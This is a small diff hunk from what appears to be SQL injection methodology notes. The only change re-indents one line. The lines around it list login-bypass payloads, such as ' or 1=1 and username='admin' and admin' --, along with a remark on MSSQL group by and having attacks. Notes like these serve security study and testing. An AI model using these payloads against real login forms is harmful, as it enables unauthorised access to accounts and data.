@@ -19,7 +19,7 @@ SQLI methodology
     ' or username LIKE '%admin%*
     Payloads, log in as admin
     *' or ( 1=1 and username='admin');
-    admin' --*
+admin' --*
 
 MsSql attacks
     Group by + having can be used to specify a search condition for a group and aggregate the result.
